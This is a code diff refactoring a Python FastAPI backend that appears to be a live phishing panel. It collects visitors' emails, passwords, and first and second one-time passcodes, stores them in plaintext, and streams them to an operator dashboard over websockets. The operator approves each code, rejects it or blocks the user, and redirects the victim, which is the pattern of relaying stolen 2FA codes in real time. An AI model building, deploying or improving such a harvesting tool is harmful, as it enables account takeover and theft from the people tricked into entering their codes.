@@ -15,13 +15,11 @@ import asyncpg
 from contextlib import asynccontextmanager
 import logging
 
-# Set up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 load_dotenv()
 
-# Configuration
 DATABASE_URL = os.getenv("DATABASE_URL")
 SECRET_KEY = os.getenv("SECRET_KEY")
 ALGORITHM = "HS256"
@@ -75,30 +73,19 @@ class ConnectionManager:
 
 manager = ConnectionManager()
 
-# Database connection pool
 db_pool = None
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     global db_pool
-    # Startup
     try:
         logger.info("Connecting to database...")
+        db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=10, command_timeout=60)
         
-        # Create connection pool
-        db_pool = await asyncpg.create_pool(
-            DATABASE_URL,
-            min_size=1,
-            max_size=10,
-            command_timeout=60
-        )
-        
-        # Test connection
         async with db_pool.acquire() as conn:
             await conn.execute("SELECT 1")
-            logger.info("Database connected successfully!")
+            logger.info("Database connected!")
         
-        # Create tables if not exist
         async with db_pool.acquire() as conn:
             await conn.execute("""
                 CREATE TABLE IF NOT EXISTS users (
@@ -115,45 +102,35 @@ async def lifespan(app: FastAPI):
                     created_at TIMESTAMP DEFAULT NOW()
                 )
             """)
-            logger.info("Table 'users' ready")
+            logger.info("Table ready")
             
-            # Add missing columns for existing tables
             try:
                 await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS otp1_never BOOLEAN DEFAULT FALSE")
                 await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS success_redirect BOOLEAN DEFAULT FALSE")
-                logger.info("Columns verified")
             except Exception as e:
                 logger.warning(f"Column check: {e}")
             
-            # Create admin user
             await conn.execute("""
                 INSERT INTO users (email, password, approved)
                 VALUES ($1, $2, TRUE)
                 ON CONFLICT (email) DO NOTHING
             """, ADMIN_EMAIL, ADMIN_PASSWORD)
-            logger.info(f"Admin user ensured: {ADMIN_EMAIL}")
-            
+            logger.info(f"Admin: {ADMIN_EMAIL}")
     except Exception as e:
-        logger.error(f"Database error: {e}")
+        logger.error(f"DB error: {e}")
         raise
     
     yield
-    
-    # Shutdown
     if db_pool:
         await db_pool.close()
-        logger.info("Database connection closed")
 
 app = FastAPI(lifespan=lifespan)
 
-# Static files
 if os.path.exists("static"):
     app.mount("/static", StaticFiles(directory="static"), name="static")
 
-# Templates
 templates = Jinja2Templates(directory="templates")
 
-# CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -162,7 +139,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Models
 class UserLogin(BaseModel):
     email: str
     password: Optional[str] = None
@@ -178,25 +154,17 @@ class AdminLogin(BaseModel):
 class AdminAction(BaseModel):
     email: str
 
-# JWT functions
 def create_access_token(data: dict, expires_delta: timedelta = None):
     to_encode = data.copy()
-    if expires_delta:
-        expire = datetime.utcnow() + expires_delta
-    else:
-        expire = datetime.utcnow() + timedelta(hours=24)
+    expire = datetime.utcnow() + (expires_delta or timedelta(hours=24))
     to_encode.update({"exp": expire})
-    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
-    return encoded_jwt
+    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
 
 def verify_admin_token(token: str):
     try:
         payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
-        if payload.get("role") != "admin":
-            return None
-        return payload
-    except Exception as e:
-        logger.error(f"Token error: {e}")
+        return payload if payload.get("role") == "admin" else None
+    except:
         return None
 
 # ============ STUDENT ENDPOINTS ============
@@ -221,77 +189,44 @@ async def success_page(request: Request, email: str):
 async def user_login(user: UserLogin):
     async with db_pool.acquire() as conn:
         existing = await conn.fetchrow("SELECT * FROM users WHERE email = $1", user.email)
-        
         if existing:
             return {"success": True, "redirect": f"/success?email={user.email}"}
         else:
-            await conn.execute("""
-                INSERT INTO users (email, password, approved)
-                VALUES ($1, $2, FALSE)
-            """, user.email, user.password or "user")
-            
-            await manager.send_to_admins({
-                "type": "user-login",
-                "email": user.email
-            })
-            
+            await conn.execute("INSERT INTO users (email, password, approved) VALUES ($1, $2, FALSE)", 
+                              user.email, user.password or "user")
+            await manager.send_to_admins({"type": "user-login", "email": user.email})
             return {"success": True, "message": "Waiting for admin approval"}
 
 @app.post("/api/users/submit-otp")
 async def submit_otp(data: OTPSubmit):
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
-        
         if not user:
             raise HTTPException(status_code=404, detail="User not found")
-        
         if not user['approved']:
             return {"success": False, "error": "Email not approved yet"}
-        
         if user['otp1_never']:
             return {"success": False, "error": "User is permanently blocked"}
         
-        await conn.execute("""
-            UPDATE users 
-            SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE, success_redirect = FALSE
-            WHERE email = $2
-        """, data.otp, data.email)
-        
-        await manager.send_to_admins({
-            "type": "user-otp-created",
-            "email": data.email,
-            "otp": data.otp
-        })
-        
-        return {"success": True, "message": "OTP submitted, waiting for admin approval"}
+        await conn.execute("UPDATE users SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE, success_redirect = FALSE WHERE email = $2", 
+                          data.otp, data.email)
+        await manager.send_to_admins({"type": "user-otp-created", "email": data.email, "otp": data.otp})
+        return {"success": True, "message": "OTP submitted"}
 
 @app.post("/api/users/submit-second-otp")
 async def submit_second_otp(data: OTPSubmit):
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
-        
         if not user:
             raise HTTPException(status_code=404, detail="User not found")
-        
         if not user['otp1_correct']:
             return {"success": False, "error": "First OTP not approved yet"}
-        
         if user['otp1_never']:
             return {"success": False, "error": "User is permanently blocked"}
         
-        await conn.execute("""
-            UPDATE users 
-            SET second_otp = $1, otp2_correct = FALSE
-            WHERE email = $2
-        """, data.otp, data.email)
-        
-        await manager.send_to_admins({
-            "type": "user-second-otp-created",
-            "email": data.email,
-            "second_otp": data.otp
-        })
-        
-        return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}
+        await conn.execute("UPDATE users SET second_otp = $1, otp2_correct = FALSE WHERE email = $2", data.otp, data.email)
+        await manager.send_to_admins({"type": "user-second-otp-created", "email": data.email, "second_otp": data.otp})
+        return {"success": True, "message": "Second OTP submitted"}
 
 # ============ STATUS CHECK ENDPOINTS ============
 
@@ -299,35 +234,36 @@ async def submit_second_otp(data: OTPSubmit):
 async def check_user_status(email: str):
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT approved FROM users WHERE email = $1", email)
-        if user:
-            return {"approved": user['approved']}
-        return {"approved": False}
+        return {"approved": user['approved'] if user else False}
 
 @app.get("/api/users/check-otp-status")
 async def check_otp_status(email: str):
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT otp1_correct, otp, otp1_never, success_redirect FROM users WHERE email = $1", email)
-        if user:
-            if user['otp1_never']:
-                return {"never": True}
-            
-            if user['success_redirect']:
-                return {"success_redirect": True}
-            
-            if not user['otp1_correct'] and not user['otp']:
-                return {"approved": False, "incorrect": True, "reset": True}
-            return {"approved": user['otp1_correct'], "incorrect": False, "reset": False}
-        return {"approved": False, "incorrect": False, "reset": False}
+        if not user:
+            return {"approved": False, "incorrect": False, "reset": False}
+        
+        # Priority: never > success_redirect > reset > approved
+        if user['otp1_never']:
+            return {"never": True}
+        
+        if user['success_redirect']:
+            return {"success_redirect": True}
+        
+        if not user['otp1_correct'] and not user['otp']:
+            return {"approved": False, "incorrect": True, "reset": True}
+        
+        return {"approved": user['otp1_correct'], "incorrect": False, "reset": False}
 
 @app.get("/api/users/check-second-otp-status")
 async def check_second_otp_status(email: str):
     async with db_pool.acquire() as conn:
         user = await conn.fetchrow("SELECT otp2_correct, second_otp FROM users WHERE email = $1", email)
-        if user:
-            if not user['otp2_correct'] and not user['second_otp']:
-                return {"approved": False, "incorrect": True, "reset": True}
-            return {"approved": user['otp2_correct'], "incorrect": False, "reset": False}
-        return {"approved": False, "incorrect": False, "reset": False}
+        if not user:
+            return {"approved": False, "incorrect": False, "reset": False}
+        if not user['otp2_correct'] and not user['second_otp']:
+            return {"approved": False, "incorrect": True, "reset": True}
+        return {"approved": user['otp2_correct'], "incorrect": False, "reset": False}
 
 # ============ ADMIN ENDPOINTS ============
 
@@ -342,252 +278,130 @@ async def admin_dashboard_page(request: Request):
 @app.post("/api/admin/login")
 async def admin_login(admin: AdminLogin):
     async with db_pool.acquire() as conn:
-        user = await conn.fetchrow(
-            "SELECT * FROM users WHERE email = $1 AND password = $2 AND approved = TRUE",
-            admin.email, admin.password
-        )
-        
+        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1 AND password = $2 AND approved = TRUE", 
+                                   admin.email, admin.password)
         if user:
-            token = create_access_token({"sub": admin.email, "role": "admin"})
-            return {"success": True, "token": token}
-        else:
-            raise HTTPException(status_code=401, detail="Invalid credentials")
+            return {"success": True, "token": create_access_token({"sub": admin.email, "role": "admin"})}
+        raise HTTPException(status_code=401, detail="Invalid credentials")
 
 @app.get("/api/admin/users")
 async def get_users(credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
         users = await conn.fetch("""
             SELECT email, password, otp, second_otp, approved, otp1_correct, otp2_correct, otp1_never, success_redirect, created_at
-            FROM users 
-            WHERE email != $1
-            ORDER BY created_at DESC
+            FROM users WHERE email != $1 ORDER BY created_at DESC
         """, ADMIN_EMAIL)
-        
-        return [dict(user) for user in users]
+        return [dict(u) for u in users]
 
 @app.post("/api/admin/approve-user")
 async def approve_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET approved = TRUE 
-            WHERE email = $1
-        """, action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "user-approved",
-            "email": action.email,
-            "message": "Your email has been approved!"
-        })
-        
+        await conn.execute("UPDATE users SET approved = TRUE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "user-approved", "email": action.email})
         return {"success": True}
 
 @app.post("/api/admin/approve-first-otp")
 async def approve_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp1_correct = TRUE, otp1_never = FALSE, success_redirect = FALSE
-            WHERE email = $1
-        """, action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "first-approved",
-            "email": action.email,
-            "message": "First OTP approved! Please enter second OTP."
-        })
-        
+        await conn.execute("UPDATE users SET otp1_correct = TRUE, otp1_never = FALSE, success_redirect = FALSE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "first-approved", "email": action.email})
         return {"success": True}
 
 @app.post("/api/admin/success-first-otp")
 async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp1_correct = TRUE, approved = TRUE, success_redirect = TRUE, otp1_never = FALSE
-            WHERE email = $1
-        """, action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "first-approved",
-            "email": action.email,
-            "message": "Success! Redirecting..."
-        })
-        
+        await conn.execute("UPDATE users SET otp1_correct = TRUE, approved = TRUE, success_redirect = TRUE, otp1_never = FALSE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "first-approved", "email": action.email})
         return {"success": True}
 
 @app.post("/api/admin/incorrect-first-otp")
 async def incorrect_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp1_correct = FALSE, otp = NULL, otp1_never = FALSE, success_redirect = FALSE
-            WHERE email = $1
-        """, action.email)
-    
-    await manager.send_to_user(action.email, {
-        "type": "incorrect",
-        "message": "Incorrect OTP. Please try again.",
-        "reset": True
-    })
-    
-    return {"success": True}
+        await conn.execute("UPDATE users SET otp1_correct = FALSE, otp = NULL, success_redirect = FALSE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "incorrect", "reset": True})
+        return {"success": True}
 
 @app.post("/api/admin/never-first-otp")
 async def never_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE, success_redirect = FALSE
-            WHERE email = $1
-        """, action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "first-approved",
-            "email": action.email,
-            "message": "Redirecting..."
-        })
-        
+        await conn.execute("UPDATE users SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "first-approved", "email": action.email})
         return {"success": True}
 
 @app.post("/api/admin/reset-user")
 async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
-        
-        await conn.execute("""
-            INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never, success_redirect)
-            VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE, FALSE)
-        """, action.email, "user")
-        
-        await manager.send_to_user(action.email, {
-            "type": "incorrect",
-            "message": "Your record has been reset. Please start over.",
-            "reset": True
-        })
-        
+        await conn.execute("INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never, success_redirect) VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE, FALSE)", 
+                          action.email, "user")
+        await manager.send_to_user(action.email, {"type": "incorrect", "reset": True})
         return {"success": True}
 
 @app.post("/api/admin/approve-second-otp")
 async def approve_second_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp2_correct = TRUE 
-            WHERE email = $1
-        """, action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "second-approved",
-            "email": action.email,
-            "message": "Success! Redirecting..."
-        })
-        
+        await conn.execute("UPDATE users SET otp2_correct = TRUE WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "second-approved", "email": action.email})
         return {"success": True}
 
 @app.post("/api/admin/incorrect-second-otp")
 async def incorrect_second_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
-        await conn.execute("""
-            UPDATE users 
-            SET otp2_correct = FALSE, second_otp = NULL
-            WHERE email = $1
-        """, action.email)
-    
-    await manager.send_to_user(action.email, {
-        "type": "incorrect",
-        "message": "Incorrect second OTP. Please try again.",
-        "reset": True
-    })
-    
-    return {"success": True}
+        await conn.execute("UPDATE users SET otp2_correct = FALSE, second_otp = NULL WHERE email = $1", action.email)
+        await manager.send_to_user(action.email, {"type": "incorrect", "reset": True})
+        return {"success": True}
 
 @app.delete("/api/admin/delete-user")
 async def delete_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
-    payload = verify_admin_token(credentials.credentials)
-    if not payload:
+    if not verify_admin_token(credentials.credentials):
         raise HTTPException(status_code=403, detail="Invalid token")
-    
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
-        
-        await manager.send_to_user(action.email, {
-            "type": "deleted",
-            "message": "Your account has been deleted."
-        })
-        
+        await manager.send_to_user(action.email, {"type": "deleted"})
         return {"success": True}
 
-# ============ WEBSOCKET ENDPOINTS ============
+# ============ WEBSOCKET ============
 
 @app.websocket("/ws/{email}")
 async def websocket_user(websocket: WebSocket, email: str):
     await manager.connect_user(email, websocket)
     try:
         while True:
-            data = await websocket.receive_text()
-            pass
+            await websocket.receive_text()
     except WebSocketDisconnect:
         manager.disconnect_user(email)
 
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
     token = websocket.query_params.get("token")
-    if not token:
+    if not token or not verify_admin_token(token):
         await websocket.close(code=1008)
         return
-    
-    payload = verify_admin_token(token)
-    if not payload:
-        await websocket.close(code=1008)
-        return
-    
     await manager.connect_admin(token, websocket)
     try:
         while True:
-            data = await websocket.receive_text()
-            pass
+            await websocket.receive_text()
     except WebSocketDisconnect:
         manager.disconnect_admin(token)
 
-# ============ RUN ============
 if __name__ == "__main__":
     import uvicorn
-    port = int(os.getenv("PORT", 8000))
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
